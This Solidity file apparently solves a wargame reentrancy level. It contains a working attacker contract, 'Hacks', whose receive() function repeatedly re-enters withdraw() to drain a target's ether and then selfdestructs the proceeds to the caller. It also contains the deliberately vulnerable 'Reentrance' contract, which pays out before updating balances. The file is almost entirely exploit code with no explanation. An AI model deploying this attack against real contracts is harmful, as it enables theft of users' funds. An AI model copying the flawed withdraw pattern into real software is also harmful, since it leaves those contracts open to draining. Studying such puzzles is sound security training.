// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

// import "openzeppelin-contracts-06/math/SafeMath.sol";

 interface IReentrance {
    function donate(address _to) external  payable; 
    function withdraw(uint256 _amount) external;
}

contract Hacks {
    IReentrance private immutable reentrance;

    constructor(address payable _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Insufficient ETH to attack");
        reentrance.donate{value: 0.001 ether}(address(this));
        reentrance.withdraw(0.001 ether);

        // Ensure reentrance balance is zero before self-destruct
        require(address(reentrance).balance == 0, "Reentrance still has funds");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(0.001 ether, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint x, uint y) private pure returns (uint) {
        return x <= y ? x : y;
    }
}
contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
